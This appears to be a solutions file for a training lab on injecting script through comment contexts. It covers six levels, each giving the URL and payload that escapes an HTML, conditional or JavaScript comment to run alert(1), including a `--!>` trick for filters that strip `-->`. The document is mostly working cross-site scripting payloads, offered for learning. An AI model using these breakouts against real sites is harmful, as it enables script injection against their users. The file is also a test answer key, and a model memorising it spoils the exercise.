# commentinj — solutions

Reflections inside HTML / JS comments — close the comment then inject.

### commentinj-level1

`/commentinj/level1/?query=--%3E%3Cscript%3Ealert(1)%3C/script%3E%3C!--`

- payload: `--><script>alert(1)</script><!--`
- context: inside `<!-- … -->` — close comment then inject

### commentinj-level2

`/commentinj/level2/?query=*/alert(1);//`

- payload: `*/alert(1);//`
- context: inside `<script>/* … */var x=1;</script>` — close block comment then run JS

### commentinj-level3

`/commentinj/level3/?query=%0Aalert(1)//`

- payload: `\nalert(1)//`
- context: inside `<script>// …\nvar x=1;</script>` — newline ends single-line comment

### commentinj-level4

`/commentinj/level4/?query=%3C![endif]--%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<![endif]--><script>alert(1)</script>`
- context: inside `<!--[if IE]>…<![endif]-->` — close conditional then inject

### commentinj-level5

`/commentinj/level5/?query=--!%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `--!><script>alert(1)</script>`
- context: `-->` stripped but HTML parser also closes comments on `--!>`

### commentinj-level6

`/commentinj/level6/?query=*/alert(1)/*`

- payload: `*/alert(1)/*`
- context: inside `<script>/* … */</script>` — close block comment then run JS
